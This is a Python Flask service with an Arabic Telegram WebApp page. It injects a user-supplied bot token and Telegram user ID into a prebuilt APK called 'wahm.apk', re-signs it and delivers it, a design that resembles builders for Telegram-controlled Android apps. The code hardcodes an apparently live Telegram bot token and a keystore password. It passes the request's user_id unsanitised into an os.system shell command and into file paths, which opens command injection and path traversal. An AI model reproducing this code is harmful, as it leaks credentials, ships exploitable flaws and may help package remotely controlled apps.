import os
import zipfile
import subprocess
import requests
from flask import Flask, render_template_string, request, send_file, jsonify

app = Flask(__name__)

UPLOAD_FOLDER = 'temp'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

BASE_APK = 'wahm.apk'
KEYSTORE = 'release.jks'
KEY_ALIAS = 'mykey'
KEY_PASS = 'password123'
TELEGRAM_BOT_TOKEN = '8737255406:AAEFenbZDgNzz5yX9QLVMdstx2nb6WBftKw'

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة فخم الماسية | حقن وتوقيع تطبيق وَهْم</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
        body { font-family: 'Cairo', sans-serif; }
        .glass { background: rgba(15, 23, 42, 0.75); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 215, 0, 0.15); }
        .glow-gold { box-shadow: 0 0 25px rgba(245, 158, 11, 0.25); }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4 selection:bg-amber-500 selection:text-slate-950">
    
    <div class="max-w-md w-full glass rounded-3xl p-7 glow-gold relative overflow-hidden">
        <!-- Background Glow Elements -->
        <div class="absolute -top-24 -right-24 w-48 h-48 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
        <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none"></div>

        <!-- Header -->
        <div class="text-center mb-6 relative z-10">
            <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-400 text-2xl mb-3 shadow-inner">
                <i class="fa-solid fa-wand-magic-sparkles"></i>
            </div>
            <h1 class="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-amber-200 via-amber-400 to-amber-600">منصة فخم لتوقيع وَهْم</h1>
            <p class="text-xs text-slate-400 mt-1">نظام آلي متطور لحقن التوكن ومعرّف المستخدم وتوقيع الحزم بأمان</p>
        </div>

        <!-- Main Form -->
        <form id="injectForm" class="space-y-4 relative z-10">
            <!-- Telegram User ID Display (Auto) -->
            <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded-xl bg-indigo-500/10 flex items-center justify-center text-indigo-400">
                        <i class="fa-brands fa-telegram"></i>
                    </div>
                    <div>
                        <span class="block text-[11px] text-slate-400">معرّف تليجرام (مكتشف تلقائياً)</span>
                        <span id="displayUserId" class="text-sm font-bold text-amber-400">جارِ الجلب...</span>
                    </div>
                </div>
                <input type="hidden" id="userId" name="user_id" value="">
                <span class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-1 rounded-full border border-emerald-500/20 font-medium">متصل بـ WebApp</span>
            </div>

            <!-- Token Input -->
            <div>
                <label class="block text-xs font-semibold text-slate-300 mb-1.5 mr-1"><i class="fa-solid fa-key text-amber-400 ml-1"></i> أدخل التوكن المطلوب:</label>
                <textarea id="tokenInput" name="token" rows="3" required class="w-full bg-slate-900/90 border border-slate-800 rounded-2xl p-3.5 text-sm text-white focus:outline-none focus:border-amber-500 transition placeholder:text-slate-600 resize-none shadow-inner" placeholder="الصق توكن البوت هنا..."></textarea>
            </div>

            <!-- Submit Button -->
            <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-500 hover:from-amber-600 hover:to-amber-500 text-slate-950 font-black py-4 rounded-2xl transition duration-300 shadow-lg shadow-amber-500/25 flex items-center justify-center gap-2 cursor-pointer active:scale-95">
                <i class="fa-solid fa-gear fa-spin-pulse"></i>
                <span>بدء الحقن والتوقيع الفوري</span>
            </button>
        </form>

        <!-- Live Progress Container (Hidden initially) -->
        <div id="progressBox" class="hidden mt-6 space-y-3 relative z-10 animate-fade-in">
            <div class="flex justify-between text-xs font-semibold">
                <span id="statusText" class="text-amber-400">جاري تهيئة البيئة...</span>
                <span id="percentText" class="text-slate-400">0%</span>
            </div>
            <!-- Progress Bar -->
            <div class="w-full bg-slate-900 rounded-full h-2.5 p-0.5 border border-slate-800">
                <div id="progressBar" class="bg-gradient-to-r from-amber-500 to-yellow-400 h-full rounded-full transition-all duration-300 w-0"></div>
            </div>
        </div>

        <!-- Result / Success Panel (Hidden initially) -->
        <div id="resultBox" class="hidden mt-6 text-center space-y-4 relative z-10 animate-fade-in">
            <div class="w-16 h-16 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 rounded-2xl mx-auto flex items-center justify-center text-2xl">
                <i class="fa-solid fa-circle-check"></i>
            </div>
            <div>
                <h3 class="text-lg font-bold text-emerald-400">تم تجهيز تطبيق وَهْم بنجاح!</h3>
                <p class="text-xs text-slate-400 mt-1">تم حقن التوكن والمعرّف، وتوقيع الـ APK بأحدث صيغ الأمان.</p>
            </div>

            <div class="grid grid-cols-2 gap-3 pt-2">
                <a id="downloadBtn" href="#" class="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold py-3 px-4 rounded-xl text-xs flex items-center justify-center gap-2 transition shadow-md shadow-amber-500/20">
                    <i class="fa-solid fa-download"></i> تحميل التطبيق
                </a>
                <button onclick="shareApp()" class="bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold py-3 px-4 rounded-xl text-xs flex items-center justify-center gap-2 transition border border-slate-700">
                    <i class="fa-solid fa-share-nodes text-amber-400"></i> مشاركة الملف
                </button>
            </div>
            
            <button onclick="resetForm()" class="text-xs text-slate-500 hover:text-slate-300 underline pt-1 block mx-auto">إجراء عملية حقن جديدة</button>
        </div>

        <!-- Footer Branding -->
        <div class="mt-6 text-center border-t border-slate-900 pt-4 relative z-10">
            <a href="https://fokhm.com" target="_blank" class="text-[11px] text-slate-500 hover:text-amber-400 transition">منصة فخم الماسية © 2026 — fokhm.com</a>
        </div>
    </div>

    <script>
        let globalDownloadUrl = '';
        let globalFileName = 'wahm_customized.apk';

        // تهيئة تليجرام ويب آي بي
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
            const user = tg.initDataUnsafe?.user;
            if (user && user.id) {
                document.getElementById('userId').value = user.id;
                document.getElementById('displayUserId').innerText = user.id + (user.username ? ' (@' + user.username + ')' : '');
            } else {
                // قيمة افتراضية في حال تم فتحه خارج تليجرام المباشر للتجربة
                document.getElementById('userId').value = '123456789';
                document.getElementById('displayUserId').innerText = '123456789 (وضع المطور)';
            }
        } else {
            document.getElementById('userId').value = '123456789';
            document.getElementById('displayUserId').innerText = '123456789 (متصفح عادي)';
        }

        const form = document.getElementById('injectForm');
        const submitBtn = document.getElementById('submitBtn');
        const progressBox = document.getElementById('progressBox');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('statusText');
        const percentText = document.getElementById('percentText');
        const resultBox = document.getElementById('resultBox');
        const downloadBtn = document.getElementById('downloadBtn');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const token = document.getElementById('tokenInput').value.trim();
            const userId = document.getElementById('userId').value;

            if (!token) return;

            // إخفاء النموذج وإظهار شريط التقدم الحي
            form.classList.add('hidden');
            progressBox.classList.remove('hidden');

            // محاكاة مراحل التقدم البصري الحي بالتوازي مع الطلب
            let progress = 10;
            progressBar.style.width = progress + '%';
            percentText.innerText = progress + '%';
            
            const steps = [
                { p: 30, text: "جارٍ نسخ ملف التطبيق الأساسي (wahm.apk)..." },
                { p: 50, text: "جارٍ حقن ملفات التوكن والمعرّف داخل assets..." },
                { p: 75, text: "جارٍ تنفيذ المحاذاة البرمجية (zipalign)..." },
                { p: 90, text: "جارٍ توقيع الحزمة بأمان (apksigner v2/v3)..." }
            ];

            let stepIdx = 0;
            const interval = setInterval(() => {
                if (stepIdx < steps.length) {
                    progressBar.style.width = steps[stepIdx].p + '%';
                    percentText.innerText = steps[stepIdx].p + '%';
                    statusText.innerText = steps[stepIdx].text;
                    stepIdx++;
                }
            }, 600);

            try {
                const formData = new FormData();
                formData.append('token', token);
                formData.append('user_id', userId);

                const response = await fetch('/generate', {
                    method: 'POST',
                    body: formData
                });

                clearInterval(interval);

                if (!response.ok) {
                    const errText = await response.text();
                    throw new Error(errText || 'فشلت عملية الحقن والتوقيع.');
                }

                // اكتمال العملية بنجاح 100%
                progressBar.style.width = '100%';
                percentText.innerText = '100%';
                statusText.innerText = 'تم الانتهاء بنجاح تام!';

                const blob = await response.blob();
                globalDownloadUrl = window.URL.createObjectURL(blob);
                
                // استخراج اسم الملف إن وجد في الهيدر
                const disposition = response.headers.get('content-disposition');
                if (disposition && disposition.includes('filename=')) {
                    globalFileName = disposition.split('filename=')[1].replace(/["']/g, '');
                }

                setTimeout(() => {
                    progressBox.classList.add('hidden');
                    downloadBtn.href = globalDownloadUrl;
                    downloadBtn.setAttribute('download', globalFileName);
                    resultBox.classList.remove('hidden');
                }, 500);

            } catch (err) {
                clearInterval(interval);
                alert('حدث خطأ: ' + err.message);
                progressBox.classList.add('hidden');
                form.classList.remove('hidden');
            }
        });

        function shareApp() {
            if (navigator.share && globalDownloadUrl) {
                fetch(globalDownloadUrl)
                    .then(res => res.blob())
                    .then(blob => {
                        const file = new File([blob], globalFileName, { type: 'application/vnd.android.package-archive' });
                        if (navigator.canShare && navigator.canShare({ files: [file] })) {
                            navigator.share({
                                title: 'تطبيق وَهْم المخصص',
                                text: 'تم إنشاء وتوقيع تطبيق وَهْم الخاص بك بنجاح عبر منصة فخم.',
                                files: [file]
                            }).catch(() => {});
                        } else {
                            fallbackShare();
                        }
                    });
            } else {
                fallbackShare();
            }
        }

        function fallbackShare() {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(window.location.href);
                alert('تم نسخ رابط المنصة إلى الحافظة بنجاح!');
            } else {
                alert('عذراً، خاصية المشاركة غير متوفرة في متصفحك الحالي.');
            }
        }

        function resetForm() {
            resultBox.classList.add('hidden');
            form.classList.remove('hidden');
            document.getElementById('tokenInput').value = '';
            progressBar.style.width = '0%';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/generate', methods=['POST'])
def generate():
    token_text = request.form.get('token')
    user_id = request.form.get('user_id', 'unknown')

    if not token_text:
        return "الرجاء إدخال التوكن!", 400

    if not os.path.exists(BASE_APK):
        return "خطأ: ملف التطبيق الأساسي (wahm.apk) غير موجود على السيرفر!", 500

    modified_apk = os.path.join(UPLOAD_FOLDER, f'wahm_mod_{user_id}.apk')
    aligned_apk = os.path.join(UPLOAD_FOLDER, f'wahm_aligned_{user_id}.apk')
    signed_apk = os.path.join(UPLOAD_FOLDER, f'wahm_signed_{user_id}.apk')

    try:
        # تنظيف الملفات المؤقتة السابقة
        for f in [modified_apk, aligned_apk, signed_apk]:
            if os.path.exists(f):
                os.remove(f)

        # 1. نسخ التطبيق الأصلي
        os.system(f"cp {BASE_APK} {modified_apk}")

        # 2. حقن كل من token.txt و id.txt داخل مجلد assets بدون فك ضغط كامل
        token_path_in_zip = 'assets/token.txt'
        id_path_in_zip = 'assets/id.txt'
        temp_zip = os.path.join(UPLOAD_FOLDER, 'temp.zip')
        
        with zipfile.ZipFile(modified_apk, 'r') as zin:
            with zipfile.ZipFile(temp_zip, 'w') as zout:
                token_exists = False
                id_exists = False
                for item in zin.infolist():
                    # استبعاد توقيعات META-INF القديمة لتجنب التضارب
                    if item.filename.startswith('META-INF/'):
                        continue
                    if item.filename == token_path_in_zip:
                        token_exists = True
                        zout.writestr(item, token_text.encode('utf-8'))
                    elif item.filename == id_path_in_zip:
                        id_exists = True
                        zout.writestr(item, str(user_id).encode('utf-8'))
                    else:
                        zout.writestr(item, zin.read(item.filename))
                
                if not token_exists:
                    zout.writestr(token_path_in_zip, token_text.encode('utf-8'))
                if not id_exists:
                    zout.writestr(id_path_in_zip, str(user_id).encode('utf-8'))

        os.replace(temp_zip, modified_apk)

        # 3. محاذاة الملف (zipalign)
        subprocess.run(['zipalign', '-v', '-p', '4', modified_apk, aligned_apk], check=True)

        # 4. توليد المفتاح تلقائياً إن لم يكن موجوداً
        global KEYSTORE
        if not os.path.exists(KEYSTORE):
            subprocess.run([
                'keytool', '-genkey', '-v',
                '-keystore', KEYSTORE,
                '-alias', KEY_ALIAS,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', KEY_PASS,
                '-keypass', KEY_PASS,
                '-dname', 'CN=Fokhm, OU=Dev, O=Fokhm, L=Riyadh, S=Riyadh, C=SA'
            ], check=True)

        # 5. التوقيع باستخدام apksigner
        sign_cmd = [
            'apksigner', 'sign',
            '--ks', KEYSTORE,
            '--ks-pass', f'pass:{KEY_PASS}',
            '--min-sdk-version', '21',
            '--v2-signing-enabled', 'true',
            '--v3-signing-enabled', 'true',
            '--in', aligned_apk,
            '--out', signed_apk
        ]
        
        result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return f"فشل التوقيع بواسطة أداة apksigner: {result.stderr}", 500

        # 6. إرسال التطبيق الناتج إلى بوت التليجرام (لبوت الإدارة والمستخدم)
        if TELEGRAM_BOT_TOKEN and user_id and user_id != 'unknown':
            try:
                caption_msg = f"✨ تم توليد وتوقيع تطبيق وَهْم بنجاح!\n👤 معرّف المستخدم: `{user_id}`\n🌐 منصة فخم: fokhm.com"
                with open(signed_apk, 'rb') as apk_file:
                    # إرسال للمستخدم عبر التليجرام
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                        data={'chat_id': user_id, 'caption': caption_msg, 'parse_mode': 'Markdown'},
                        files={'document': ('wahm_customized.apk', apk_file)}
                    )
            except Exception as tg_err:
                print(f"Telegram send error: {tg_err}")

        # 7. إرسال الملف النهائي للتحميل المباشر للعميل
        return send_file(signed_apk, as_attachment=True, download_name='wahm_customized.apk')

    except Exception as e:
        return f"حدث خطأ أثناء المعالجة: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

